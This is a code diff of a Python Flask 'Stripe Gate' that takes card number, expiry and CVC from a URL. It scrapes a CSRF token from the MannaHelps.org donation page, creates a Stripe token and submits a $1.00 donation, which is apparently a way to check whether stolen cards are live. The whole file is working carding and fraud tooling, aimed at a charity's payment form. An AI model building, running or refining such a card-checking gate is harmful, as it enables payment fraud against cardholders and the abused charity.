@@ -7,12 +7,11 @@ from flask import Flask, request, jsonify
 app = Flask(__name__)
 session = requests.Session()
 
-# -------------------------------------------------
-# 1. CLEAN RESPONSE PARSER
-# -------------------------------------------------
+# ===============================================
+# 1. CLEAN RESPONSE PARSER (NO GARBAGE)
+# ===============================================
 def log_final_response(response):
     try:
-        # Try JSON first
         try:
             data = response.json()
             if 'error' in data:
@@ -22,16 +21,12 @@ def log_final_response(response):
                 code = ''
                 msg  = data
         except json.JSONDecodeError:
-            # HTML fallback
             html = response.text
-
-            # Remove noisy "Param is:" lines
+            # Remove noisy lines
             html = re.sub(r'[\r\n]+Param\s*is:.*?(?=[\r\n]|<)', '', html, flags=re.I)
-
-            # Extract Code / Message cleanly
+            # Extract clean code/message
             code_match = re.search(r'Code\s*is:\s*([^<\n]+)', html, re.I)
             msg_match  = re.search(r'Message\s*is:\s*([^<\n]+)', html, re.I)
-
             code = code_match.group(1).strip() if code_match else ''
             msg  = msg_match.group(1).strip() if msg_match else 'Unknown error'
 
@@ -42,7 +37,6 @@ def log_final_response(response):
                 "message": msg
             }
         }
-
     except Exception as e:
         result = {
             "error_code": "parse_error",
@@ -51,14 +45,13 @@ def log_final_response(response):
                 "message": f"Parse failed: {str(e)}"
             }
         }
-
     print(json.dumps(result, indent=2))
     return result
 
 
-# -------------------------------------------------
-# 2. CSRF TOKEN FETCH
-# -------------------------------------------------
+# ===============================================
+# 2. GET CSRF TOKEN
+# ===============================================
 def get_csrf_token():
     headers = {
         'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36',
@@ -73,9 +66,9 @@ def get_csrf_token():
         return None
 
 
-# -------------------------------------------------
-# 3. STRIPE TOKEN CREATION
-# -------------------------------------------------
+# ===============================================
+# 3. CREATE STRIPE TOKEN
+# ===============================================
 def create_stripe_token(cc, mm, yy, cvc):
     if len(yy) == 2:
         yy = '20' + yy
@@ -107,12 +100,12 @@ def create_stripe_token(cc, mm, yy, cvc):
         j = r.json()
         return j.get('id'), None
     except Exception as e:
-        return None, f"Stripe token error: {str(e)}"
+        return None, f"Stripe error: {str(e)}"
 
 
-# -------------------------------------------------
+# ===============================================
 # 4. SUBMIT DONATION
-# -------------------------------------------------
+# ===============================================
 def submit_donation(stripe_token):
     csrf = get_csrf_token()
     if not csrf:
@@ -144,6 +137,9 @@ def submit_donation(stripe_token):
         return {"error_code": "submit_error", "response": {"code": "submit_error", "message": str(e)}}
 
 
+# ===============================================
+# 5. MAIN ENDPOINT – NO CARD NUMBER CHECK
+# ===============================================
 @app.route('/gate=stripe1$/cc=<path:card>', methods=['GET'])
 def stripe_gate(card):
     try:
@@ -157,9 +153,7 @@ def stripe_gate(card):
 
         cc, mm, yy, cvc = parts
 
-        # --- NO CARD NUMBER CHECKING ANYMORE ---
-        # Only validate MM, YY, CVC format
-
+        # === ONLY VALIDATE MM, YY, CVC FORMAT ===
         if not mm.isdigit() or not (1 <= int(mm) <= 12):
             return jsonify({"error_code": "invalid_mm", "response": {"code": "invalid_mm", "message": "Invalid month"}}), 400
         if not yy.isdigit() or len(yy) not in [2, 4]:
@@ -167,7 +161,7 @@ def stripe_gate(card):
         if not cvc.isdigit():
             return jsonify({"error_code": "invalid_cvc", "response": {"code": "invalid_cvc", "message": "CVC must be digits"}}), 400
 
-        # --- AMEX CVC LOGIC (ONLY CHECK) ---
+        # === AMEX CVC RULE ===
         is_amex = cc.startswith('3')
         cvc_len = len(cvc)
 
@@ -190,7 +184,7 @@ def stripe_gate(card):
                     }
                 }), 400
 
-        # --- CREATE STRIPE TOKEN ---
+        # === CREATE TOKEN & SUBMIT ===
         token, err = create_stripe_token(cc, mm, yy, cvc)
         if not token:
             return jsonify({
@@ -198,34 +192,39 @@ def stripe_gate(card):
                 "response": {"code": "token_failed", "message": err or "Token creation failed"}
             }), 400
 
-        # --- SUBMIT DONATION ---
         return jsonify(submit_donation(token)), 200
 
     except Exception as e:
         return jsonify({
             "error_code": "server_error",
             "response": {"code": "server_error", "message": f"Server error: {str(e)}"}
-, {e.__class__.__name__}"}
         }), 500
 
-# -------------------------------------------------
+
+# ===============================================
 # 6. HOME PAGE
-# -------------------------------------------------
+# ===============================================
 @app.route('/')
 def home():
     return """
-    <h2>Stripe Gate v2 – MannaHelps.org</h2>
+    <h2>Stripe Gate v3 – MannaHelps.org</h2>
     <p><b>Endpoint:</b> <code>/gate=stripe1$/cc=371449635398431|12|27|1234</code></p>
     <p><b>Format:</b> <code>cc|mm|yy|cvc</code></p>
-    <p><b>Rules:</b></p>
+    <p><b>CVC Rules:</b></p>
     <ul>
       <li>Amex (starts with 3) → 4-digit CVC only</li>
-      <li>All others → 3-digit CVC only</li>
+      <li>All other cards → 3-digit CVC only</li>
     </ul>
+    <p><b>No card number validation</b> – only CVC length checked.</p>
     <p>Charges $1.00</p>
     """
 
 
+# ===============================================
+# 7. RUN SERVER
+# ===============================================
 if __name__ == '__main__':
-    print("Gate running → http://127.0.0.1:5000")
+    print("Stripe Gate v3 Running")
+    print("→ http://127.0.0.1:5000")
+    print("Example: /gate=stripe1$/cc=4111111111111111|12|25|123")
     app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
